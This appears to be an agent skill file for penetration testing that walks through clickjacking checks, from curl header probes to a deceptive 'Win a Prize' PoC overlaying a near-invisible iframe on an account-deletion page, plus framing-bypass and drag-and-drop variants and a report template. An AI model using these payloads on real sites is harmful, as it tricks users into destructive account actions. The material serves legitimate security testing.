---
name: vuln-clickjacking
description: "Clickjacking (UI redressing) vulnerability testing. X-Frame-Options check, CSP frame-ancestors bypass, PoC iframe creation, drag-and-drop variant, multi-step clickjacking. Triggers: 'clickjacking', 'ui redressing', 'iframe attack', 'x-frame-options', 'csp frame-ancestors', 'clickjacking poc', 'frame injection'."
---

# Clickjacking (UI Redressing)

Test framing protections → craft PoC → demonstrate click hijacking.

---

## Phase 1: Check Framing Protections

```bash
TARGET="https://TARGET"

# Check response headers:
curl -sI "$TARGET" | grep -iE "x-frame-options|content-security-policy"

# X-Frame-Options values:
# DENY              — no framing at all (secure)
# SAMEORIGIN        — only same-origin framing (may be acceptable)
# ALLOW-FROM https  — deprecated, browser support varies
# [missing]         — vulnerable

# CSP frame-ancestors:
# frame-ancestors 'none'             — secure
# frame-ancestors 'self'             — allows same-origin
# frame-ancestors *                  — fully permissive (vulnerable)
# frame-ancestors https://trusted.com — only trusted origin

# Quick check:
XFO=$(curl -sI "$TARGET" | grep -i x-frame-options)
CSP=$(curl -sI "$TARGET" | grep -i content-security-policy | grep -i frame-ancestors)
echo "X-Frame-Options: $XFO"
echo "CSP frame-ancestors: $CSP"
```

---

## Phase 2: Verify Framing Works

```html
<!-- test-frame.html — open in browser to check if TARGET loads in iframe -->
<!DOCTYPE html>
<html>
<head><title>Clickjacking Test</title></head>
<body>
  <h1>Framing Test</h1>
  <iframe src="https://TARGET/sensitive-page" width="800" height="600"
          style="border: 2px solid red;"></iframe>
  <!-- If target loads: vulnerable -->
  <!-- If target blocks: protected (blank frame, error, or redirect) -->
</body>
</html>
```

---

## Phase 3: Proof of Concept

```html
<!-- clickjacking-poc.html -->
<!DOCTYPE html>
<html>
<head>
<title>Win a Prize!</title>
<style>
  body { font-family: Arial; }
  #decoy {
    position: absolute;
    top: 300px;
    left: 200px;
    z-index: 1;
    padding: 10px 20px;
    background: #007bff;
    color: white;
    border: none;
    font-size: 16px;
    cursor: pointer;
  }
  #target_frame {
    position: absolute;
    top: 200px;
    left: 0;
    width: 100%;
    height: 600px;
    opacity: 0.1;        /* nearly invisible but clickable */
    z-index: 2;
  }
</style>
</head>
<body>
  <h1>Congratulations! You've won a prize!</h1>
  <p>Click the button below to claim your reward:</p>
  <button id="decoy">Claim Prize!</button>
  
  <!-- Hidden iframe overlaid on top -->
  <iframe id="target_frame" src="https://TARGET/account/delete">
  </iframe>
</body>
</html>
```

---

## Phase 4: Sensitive Action Targets

```bash
TARGET="https://TARGET"

# High-value clickjacking targets:
SENSITIVE_PATHS=(
  "/account/delete"
  "/account/settings"
  "/password/change"
  "/email/change"
  "/admin"
  "/payment/confirm"
  "/transfer"
  "/api/keys/create"
  "/oauth/authorize"
  "/settings/mfa/disable"
)

for path in "${SENSITIVE_PATHS[@]}"; do
  echo "Testing $TARGET$path"
  curl -sI "$TARGET$path" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"
  echo "---"
done
```

---

## Phase 5: Bypass Techniques

```html
<!-- Sandbox bypass — sandbox attribute allows scripts but no allow-same-origin -->
<iframe src="https://TARGET" sandbox="allow-scripts allow-forms allow-top-navigation"></iframe>

<!-- Double framing (old bypass for ALLOW-FROM):
     Victim → Attacker Frame 1 (allowed) → Attacker Frame 2 → Target
     Inner frame origin check passes because parent is allowed -->
<iframe src="attacker_inner.html"></iframe>
<!-- attacker_inner.html contains the target iframe -->

<!-- Drag-and-drop variant (text extraction without clicking):
     Victim drags "text" from target frame into attacker's text box -->
<iframe src="https://TARGET/secret-page" id="secret"></iframe>
<textarea id="dump" ondrop="capture(event)"></textarea>
<script>
function capture(e) {
  console.log("Dragged text:", e.dataTransfer.getData('text'));
}
</script>
```

---

## Report Template

```markdown
## Clickjacking Vulnerability

**Severity:** Medium (High if combined with sensitive one-click action)

**Affected URL:** https://TARGET/account/settings

**Finding:** The application does not set X-Frame-Options or CSP frame-ancestors.
The page loads within a cross-origin iframe, enabling clickjacking attacks.

**Impact:** Attacker can overlay the application within their site and trick
authenticated users into performing unintended actions (account deletion,
password change, OAuth authorization).

**PoC:** clickjacking-poc.html (see attached)

**Recommendations:**
1. Add header: `X-Frame-Options: DENY` (or `SAMEORIGIN` if self-framing needed)
2. Add CSP: `Content-Security-Policy: frame-ancestors 'none'`
3. Add confirmation dialogs for all sensitive actions
```

---

## Output

Save to `.omop/engagement/vuln/clickjacking/`:
- `poc.html` — working clickjacking PoC
- `headers.txt` — missing headers evidence

## Next Phase

→ `vuln-oauth` if OAuth authorization clickjacking
→ `pentest-report` for final report
